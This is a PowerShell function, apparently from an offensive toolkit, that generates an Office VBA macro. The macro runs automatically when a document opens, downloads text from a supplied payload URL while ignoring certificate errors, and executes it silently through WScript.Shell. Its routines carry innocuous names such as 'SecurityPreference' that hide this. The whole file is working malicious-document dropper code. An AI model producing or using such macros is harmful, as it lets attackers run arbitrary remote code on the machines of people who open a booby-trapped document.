function Build-VBAMacro {
#.SYNOPSIS
# Generate VBA Macro that Executes Code from a Specified URL
# ARBITRARY VERSION NUMBER:  3.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# TBA
# 
# Parameters:
#   -PayloadURL  -->  URL of the hosted payload that the macro points to
#   -PrivateSub  -->  Make Subroutine Private instead of Public
#   -Help        -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmor


    Param(
        [string]$PayloadURL,
        [switch]$PrivateSub,
        [switch]$Help
    )
    

    # Return Get-Help Information
    if ($Help) { return (Get-Help Build-VBAMacro) }


    # Error Correction
    if (!$PayloadURL)                 { return (Write-Host 'Template URL not input.' -ForegroundColor Red) }
    if ($PayloadURL -notlike "http*") { return (Write-Host 'Template URL not in correct format.' -ForegroundColor Red) }
    

    # Toggle private macros
    if ($PrivateSub) { $Sub = 'Private ' }
    else             { $Sub = $NULL      }

    
    # Supports HTTPS URLs with Self-Signed Certificates
    $Macro = @"
${Sub}Sub AutoOpen()
        SecurityPreference
End Sub

${Sub}Sub Document_Open()
        SecurityPreference
End Sub

${Sub}Sub SecurityPreference()
        Set Request = CreateObject("MSXML2.ServerXMLHTTP")
        Request.SetOption 2, Request.GetOption(2)
        Request.Open "GET", "$PayloadURL", False
        Request.Send
        Dim Security As String
        Security = Request.ResponseText
        Set Update = CreateObject("WScript.Shell")
        Update.Run (Security), 0
        Set Update = Nothing
End Sub
"@

    return $Macro
}